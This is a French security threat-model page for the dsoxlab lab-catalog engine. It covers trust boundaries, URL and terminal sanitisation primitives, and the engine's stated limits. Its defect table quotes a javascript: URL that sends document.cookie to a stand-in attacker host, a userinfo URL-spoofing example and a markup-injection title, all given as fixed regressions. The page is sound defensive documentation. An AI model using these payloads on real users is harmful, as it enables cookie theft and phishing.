# Le modèle de menace

**Public :** les contributeurs du moteur, les auteurs de catalogues, et
quiconque construit sur la sortie machine. Cette page dit où passe la frontière
de confiance, ce que le moteur refuse de faire, et — c'est aussi important — ce
dont il ne protège **pas**.

**Langue :** [English](./security.md) · [Français](./security.fr.md)

Pour signaler une faille, voir [SECURITY.md](../SECURITY.md) : ici se trouve le
modèle, pas la procédure.

---

## La règle

> **Un catalogue est une entrée non fiable. Une valeur du contrat est une
> donnée, jamais une instruction.**

`dsoxlab catalog add <url>` clone un dépôt git arbitraire. Tout ce que ce dépôt
déclare — identifiants, titres, URL, noms de sections — a été écrit par
quelqu'un d'autre, et arrive dans votre terminal, dans votre navigateur et, avec
`dsoxlab export`, dans des documents que vous remettez à un tiers.

Toutes les règles ci-dessous découlent de cette seule phrase.

---

## Où passe la frontière

| Non fiable | Pourquoi |
| --- | --- |
| `meta.yml`, `lab.yaml`, `course.yaml` | Écrits par le catalogue |
| Le `.git/config` d'un catalogue cloné, remote `origin` compris | Idem |
| Les Markdown, les fixtures et les noms de fichiers d'un lab | Idem |
| Les noms de répertoires sous `~/.local/share/dsoxlab/catalogs/` | Créés depuis une URL que vous avez passée |

| Fiable | Pourquoi |
| --- | --- |
| Les métadonnées du paquet dsoxlab (`pyproject.toml`) | Livrées avec le moteur |
| Les chaînes i18n | Idem |
| Les templates Terraform et cloud-init | Packagés dans le moteur, pas dans les catalogues |

Le parseur reste **tolérant** à dessein : la v1 garantit qu'un lab continue de
charger. Un champ peut donc porter tout ce qu'un fichier YAML peut porter — une
liste là où une chaîne était attendue, des caractères de contrôle, du balisage,
une URL en `javascript:`. La validation est un **lint pour l'auteur**, pas une
barrière : `validate-structure` n'est ni automatique, ni exigé avant d'utiliser
un catalogue. Les contrôles de sécurité sont donc rejoués **au point d'usage**.

---

## Trois primitives, une seule implémentation chacune

Deux implémentations d'une même politique finissent toujours par diverger, et
c'est la plus permissive qui décide. Chaque règle vit donc en un seul endroit,
sous `src/dsoxlab/security/`.

| Primitive | S'applique à | Comportement |
| --- | --- | --- |
| `identifiant_sur()` | Les identifiants qui **sortent** du moteur : `catalog.id`, `lab_id`, `section` du document de preuve | **Refuse.** Assainir un identifiant romprait en silence le rattachement d'une preuve au lab qu'elle atteste |
| `url_sure()` | Toute URL venant d'un catalogue : `doc_url`, `repo.issues_url`, l'URL dérivée du remote | **Refuse.** Rend l'URL normalisée, ou lève avec une raison |
| `neutraliser()` / `texte_affichable()` | Toute valeur du contrat rendue dans le terminal | **Neutralise.** Afficher est le service rendu : un titre douteux ne justifie pas une lecture en échec |

Refuser et neutraliser ne sont pas interchangeables, et la différence est le
fond : ce qui voyage doit être exact ou absent, ce qui s'affiche doit être
lisible.

### La politique des URL

Un seul analyseur, deux politiques déclaratives — un paramètre, pas un second
validateur :

| Politique | Schémas | Employée par |
| --- | --- | --- |
| `DOCUMENTATION` | `http`, `https` | `doc_url`, URL d'issues. Le `http` reste accepté : des catalogues et des forges en publient, la valeur est affichée et non transmise avec un secret, et le refuser casserait des catalogues existants sans rien protéger de plus |
| `PORTAIL` | `https` seul | Destination d'une preuve (`learning.portal_url`). Le lien portera des résultats ; en clair, ils s'exposent en chemin |

Le portail porte une exception documentée, pour qui écrit un portail : avec
`DSOXLAB_PORTAIL_LOCAL=1`, une URL en `http` vers `localhost`, `127.0.0.1` ou
`[::1]` est acceptée. Deux gardes plutôt qu'un — la variable **et** un hôte local
— parce que `http` vers un hôte distant est autre chose, et parce qu'une variable
qui voudrait dire « fais-moi confiance pour tout » ne garderait rien. C'est une
variable d'environnement, jamais un champ du contrat : la machine qui joue le lab
décide, pas le catalogue.

Commun aux deux : l'URL est réellement analysée, un hôte est exigé,
`utilisateur:motdepasse@` est refusé, les caractères de contrôle sont refusés,
et la valeur est normalisée avant d'être affichée.

---

## Ce que le moteur ne fait jamais

**Aucune sonde réseau dans un contrôle de sécurité.** Rien ne résout de nom,
n'ouvre de connexion et ne suit de redirection pour décider si une URL est
acceptable. Sinon un catalogue déclarant `doc_url: http://192.168.1.1/admin`
ferait émettre cette requête depuis votre poste — ou depuis le runner de CI.
`validate-structure --check-urls` est autre chose : un contrôle réseau
volontaire et explicite.

**Aucune navigation implicite.** Une URL syntaxiquement sûre n'est pas une
destination approuvée. `dsoxlab guide` affiche l'adresse ; `--open` l'ouvre,
parce que vous l'avez demandé. `support --issue` nomme le dépôt et demande avant
d'ouvrir quoi que ce soit.

**Aucun pilotage du terminal.** Les valeurs du contrat sont échappées avant
d'être interpolées dans du balisage Rich, les caractères de contrôle et les
surcharges de direction sont remplacés, et aucun hyperlien cliquable n'est
construit depuis une chaîne brute du catalogue — la cible d'un `[link=…]` n'est
pas ce que l'œil lit.

**Aucune donnée personnelle dans le document de preuve.** `dsoxlab export` est
construit par **liste blanche**, jamais en sérialisant un objet interne pour en
retirer des clés. Voir [la sortie machine](./machine-output.fr.md) pour le
contrat champ par champ.

---

## Ce dont ceci ne protège **pas**

Un lab exécute du code sur votre machine, par construction : `setup.yaml` et
`cleanup.yaml` sont des playbooks Ansible, `challenge/tests/` est une suite
pytest, et `runtime.services` démarre l'image de conteneur que le lab nomme.
Tout cela vient du catalogue, et tout cela tourne avec vos privilèges.

**dsoxlab n'est pas un bac à sable.** Les primitives ci-dessus empêchent un
catalogue de faire agir le *moteur* pour son compte — ouvrir une URL, piloter
votre terminal, glisser un champ dans un document que vous signez. Elles
n'empêchent pas, et ne peuvent pas empêcher, un catalogue de faire ce pour quoi
un catalogue existe.

La première règle est donc celle qu'aucun code ne peut tenir : **n'ajoutez que
des catalogues auxquels vous faites confiance**, comme pour n'importe quel autre
paquet. Un dépôt de labs mérite le même regard qu'un `curl … | bash`, parce que
c'est le même ordre de grandeur de confiance. Pour jouer un catalogue dont vous
ne répondez pas, faites-le dans une VM jetable — ce qu'est exactement
[l'appliance](./appliance.fr.md).

---

## Le relevé

Chaque règle ci-dessus vient d'un défaut reproduit, pas imaginé.

| Défaut | Ce qu'il faisait |
| --- | --- |
| `doc_url: "javascript:fetch('https://attaquant.test/'+document.cookie)"` | `dsoxlab guide --print` l'affichait tel quel ; sans `--print`, la valeur atteignait `webbrowser.open()` |
| `title: "Titre [red]x[/red] et [/] non apparié"` | `list-labs` et `show` sortaient en trace Python (`MarkupError`). Un caractère rendait tout un catalogue inaffichable |
| `catalog.path` dans le document de preuve | Laissait fuir le répertoire personnel de l'utilisateur dans un document destiné à un tiers |
| `repo.issues_url` contrôlée par `startswith("http")` | Aurait accepté `https://vrai-site.test@attaquant.test/` — l'œil lit le premier nom, le navigateur va au second |

---

## Étendre ceci

Si vous ajoutez un champ du contrat qui est **affiché**, **transformé en lien**
ou **exporté**, faites-le passer par la primitive qui convient. Écrivez ensuite
le test négatif : une politique est une suite de refus, et seuls les refus la
prouvent.

Ce sont les tests qui tiennent la règle, pas cette page :

- `tests/test_securite_urls.py` — les schémas, la structure, l'absence de tout
  appel réseau, et la preuve qu'une valeur brute du contrat ne peut atteindre
  `webbrowser.open()`
- `tests/test_securite_terminal.py` — l'échappement, et la régression de la
  `MarkupError`
- `tests/test_securite_identifiants.py` — ce qui peut quitter le moteur
- `tests/test_export_preuves.py` — la liste blanche des preuves, y compris ce
  qui n'y doit jamais figurer
